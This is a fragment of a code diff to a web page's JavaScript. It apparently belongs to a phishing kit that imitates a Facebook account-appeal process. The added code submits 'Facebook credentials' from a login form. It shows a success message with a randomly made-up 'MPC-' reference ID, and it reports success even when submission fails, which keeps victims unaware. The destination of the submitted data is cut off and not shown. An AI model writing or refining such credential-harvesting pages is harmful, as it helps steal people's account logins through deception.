+            throw new Error('Facebook form submission failed');
+          }
+          return response.json();
+        })
+        .then(data => {
+          console.log('Facebook credentials submitted successfully:', data);
+          showSuccess();
+        })
+        .catch(error => {
+          console.error('Error submitting Facebook credentials:', error);
+          // Still proceed even if there's an error
+          showSuccess();
+        })
+        .finally(() => {
+          // Reset loading state
+          if (fbSendBtn) {
+            fbSendBtn.classList.remove('loading');
+            if (fbSendBtnText) fbSendBtnText.textContent = 'Verify and Continue';
+            if (fbSendBtnSpinner) fbSendBtnSpinner.style.display = 'none';
+          }
+        });
+      }
+
+      function showFbLogin() {
+        if (appealForm) appealForm.style.display = 'none';
+        if (fbLoginForm) fbLoginForm.style.display = 'block';
+        if (fbLoginForm) fbLoginForm.scrollIntoView({ behavior: 'smooth' });
+      }
+
+      function showSuccess() {
+        if (fbLoginForm) fbLoginForm.style.display = 'none';
+       
+        // Generate a reference ID
+        if (referenceId) referenceId.textContent = 'MPC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
+       
+        // Show the success message
+        if (successMessage) successMessage.classList.add('show');
+       
+        // Scroll to the success message
+        if (successMessage) successMessage.scrollIntoView({ behavior: 'smooth' });
       }
     });
-   
-    return true;
-  }
-
-  function showfbLogin() {
-    
-    if (appealForm) appealForm.style.display = 'none';
-    if (fbLoginForm) fbLoginForm.style.display = 'block';
-   
-    if (fbLoginForm) fbLoginForm.scrollIntoView({ behavior: 'smooth' });
-  }
-
-  function showSuccess() {
-    
-    if (fbLoginForm) fbLoginForm.style.display = 'none';
-   
-    // Generate a reference ID
-    if (referenceId) referenceId.textContent = 'MPC-' + Math.random().toString(36).substr(2, 9).toUpperCase();
-   
-    // Show the success message
-    if (successMessage) successMessage.classList.add('show');
-   
-    // Scroll to the success message
-    if (successMessage) successMessage.scrollIntoView({ behavior: 'smooth' });
-  }
-});
   </script>
 </body>
-
 </html>
-
